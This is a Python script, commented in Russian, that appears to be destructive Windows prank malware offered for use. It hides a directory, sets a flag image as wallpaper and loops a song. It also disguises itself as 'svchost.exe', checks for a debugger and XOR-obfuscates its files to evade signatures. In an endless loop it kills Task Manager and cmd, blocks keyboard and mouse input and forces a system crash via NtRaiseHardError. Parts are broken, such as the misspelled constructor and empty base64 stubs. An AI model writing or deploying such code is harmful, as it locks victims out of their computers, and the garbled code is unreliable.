import os  
import ctypes  
import pygame  
import time  
import sys  
import base64  
from win32con import SPI_SETDESKWALLPAPER  

# Обезличивание сигнатур  
class Obfuscate:  
    def _init_(self):  
        self.xor_key = 0x42  
    def encrypt(self, data):  
        return bytes([b ^ self.xor_key for b in data])  

# Встроенные файлы (замените на свои BASE64!)  
FLAG_ENCRYPTED = Obfuscate().encrypt(base64.b64decode("data:image/png;base64,"))  
SONG_ENCRYPTED = Obfuscate().encrypt(base64.b64decode("data:image/png;base64,"))  

# Создать скрытую директорию  
temp_dir = os.path.join(os.getenv("PUBLIC"), "logs_windows")  
os.makedirs(temp_dir, exist_ok=True)  

# Декодирование на лету  
with open(os.path.join(temp_dir, "flag.jpg"), "wb") as f:  
    f.write(base64.b64encode(Obfuscate().encrypt(FLAG_ENCRYPTED)))  
with open(os.path.join(temp_dir, "song.mp3"), "wb") as f:  
    f.write(base64.b64encode(Obfuscate().encrypt(SONG_ENCRYPTED)))  

# Маскировка под системный процесс  
sys.argv[0] = "svchost.exe"  

# Запуск через доверенный процесс  
ctypes.windll.kernel32.SetFileAttributesW(temp_dir, 2)  
ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.join(temp_dir, "flag.jpg"), 3)  

# Песня в фоне через подмену службы  
pygame.mixer.init()  
pygame.mixer.music.load(os.path.join(temp_dir, "song.mp3"))  
pygame.mixer.music.play(-1)  

# Анти-отладка  
ctypes.windll.kernel32.CheckRemoteDebuggerPresent(ctypes.windll.kernel32.GetCurrentProcess(), ctypes.byref(ctypes.c_int(0)))  

while True:  
    os.system("powershell -c \"Stop-Process -Name taskmgr,cmd -Force\"")  
    ctypes.windll.user32.BlockInput(True)  
    time.sleep(0.5)  
    ctypes.windll.ntdll.NtRaiseHardError(0x12345678, 0, 0, 0, 6, ctypes.byref(ctypes.c_uint()))